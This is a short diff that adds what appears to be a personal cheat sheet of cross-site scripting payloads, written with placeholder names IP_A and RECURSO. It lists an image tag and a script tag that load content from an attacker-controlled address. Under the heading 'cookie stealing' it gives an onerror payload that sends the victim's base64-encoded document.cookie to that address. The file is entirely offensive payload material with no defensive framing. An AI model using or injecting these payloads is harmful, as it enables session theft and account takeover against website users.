@@ -1,0 +1,6 @@
+# XSS
+< img src='http://IP_A/RECURSO' />
+< script src='http://IP_A/script' > </script>
+
+# cookie stealing
+< img src=RECURSO onerror=this.src='http://IP_A/?cookies='+btoa(document.cookie) />
